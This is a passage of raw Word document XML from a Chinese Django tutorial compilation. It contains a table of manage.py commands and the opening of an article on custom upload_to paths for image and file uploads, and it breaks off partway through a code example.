                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py shell</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="085A1344" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py dbshell(数据库交互)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="3EBC5FC6" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="70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4473206" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>查看当前版本</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="421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A56CB27" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py version</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E729E97" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django-admin.py和manage.py其它命令</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="10152" w:type="dxa"/>
        <w:jc w:val="center"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4178"/>
        <w:gridCol w:w="5974"/>
      </w:tblGrid>
      <w:tr w:rsidR="00016AA9" w14:paraId="1A4FAF1E"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E3AF202" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode10"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="3DAAD6"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>命令</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="406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662E09E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode11"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="3DAAD6"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>用途</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="1364BFEC"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DFDE1B2" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py flush</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="412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4FFFA1F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>清空数据库内容，只留下空表</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FC854AA" w14:textId="680CD977" w:rsidR="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="4C7CF984"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B238320" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py test</w:t>
            </w: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C6A138E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>开始测试</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="00B83588"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17D0901" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py collectstatic</w:t>
            </w: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4CF5336" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>搜集静态文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="50F9B806"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5EA6000" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py createcachetable</w:t>
            </w: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B719F50" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>创建缓存表</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="34CB1084"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D219362" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py check</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="171590AE" w14:textId="1CF5649D" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pP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15C162A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>检测项目有没有问题</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="793DC0E0"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D4567D3" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py inspectdb [table]</w:t>
            </w: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1AACFB9F" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>根据已有数据库反向生成django模型。你可以选择数据表名字</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="4F5CEF95"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11D4178" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py makemessages</w:t>
            </w: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6A65683E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>搜集所有的messages，可以生成指定文件格式如xml文件，供后期翻译</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="361EFA23"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3B6017E6" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>python manage.py sendemail [email]</w:t>
            </w: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70819430" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>发送测试邮件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00016AA9" w14:paraId="6F055DDB" w14:textId="77777777" w:rsidTr="00016AA9">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2895"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5D6EDE90" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>python manage.py showmigrations</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4140" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="6" w:space="0" w:color="4C4C4C"/>
              <w:left w:val="single" w:sz="6" w:space="0" w:color="4C4C4C"/>
              <w:bottom w:val="single" w:sz="6" w:space="0" w:color="4C4C4C"/>
              <w:right w:val="single" w:sz="6" w:space="0" w:color="4C4C4C"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="75" w:type="dxa"/>
              <w:left w:w="150" w:type="dxa"/>
              <w:bottom w:w="75" w:type="dxa"/>
              <w:right w:w="150" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="015D2FF4" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRDefault="00016AA9">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>显示所有数据库迁移文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5806C1C6" w14:textId="2D32F086" w:rsidR="001C47AF" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">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100</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId342" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django自定义图片和文件上传路径(upload_to)的2种方式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="683153CD" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django自定义图片和文件上传路径(upload_to)的2种方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4768BD6F" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId343" w:history="1">
        <w:r w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-06-15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAEDCAC" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django实战</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF10E4E" w14:textId="63786178" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>最近在做一个仿知乎网站的项目了，里面涉及很多图片和文件上传。趁此机会我给大家总结下Django自定义图片和文件上传路径的2种方式吧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BEA3EC" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法1: 在Django模型中定义upload_to选项。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1537BE" w14:textId="54C6CF8A" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django模型中的ImageField和FileField的upload_to选项是必填项，其存储路径是相对于MEIDA_ROOT而来的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C082E9F" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们来看一个简单案例（如下所示)。如果你的MEDIA_ROOT是/media/文件夹，而你的上传文件夹upload_to=“avatar", 那么你上传的文件会自动存储到/media/avatar/文件夹。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C70BA1" w14:textId="461CAA87" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class UserProfile(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66382D14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='profile')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F13EE3" w14:textId="5AC802B4" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    avatar = models.ImageField(upload_to='avatar', verbose_name="</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>头像</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3903C45D" w14:textId="678FB7DF" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你的文件名是sky.jpg, 那么图片上传后数据库中的avatar字段为avatar/sky.jpg, 该字段指向图片对象，而非绝对路径。要在模板中使用该图片，应该使用avatar.url (即/media/avatar/sky.jpg）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6090FA40" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>但在实际应用中，请千万别这么做。这里有2个严重问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DD5A9E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>所有用户都把头像上传到了同一个avatar文件夹了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEA326C" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原文件名是什么，那么新文件名就是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2678E2B8" w14:textId="0A408089" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>试想用户很多，很可能发生文件重名问题，造成后来用户上传的文件把前面用户上传的头像覆盖了，造成了用户A挂用户B头像的状况。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069E7F7E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正确的做法是动态定义上传路径，把图片存储到用户自己的文件夹下，并对其重命名。如下图所示。这样图片就会保存在/media/1/avatar/里了，而且文件以uuid命名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E4139E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553C4C47" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2194A6" w14:textId="32629024" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import uuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB34477" w14:textId="7A51E246" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your models here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66A2FA94" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def user_directory_path(instance, filename):</w:t>
      </w:r>
    </w:p>
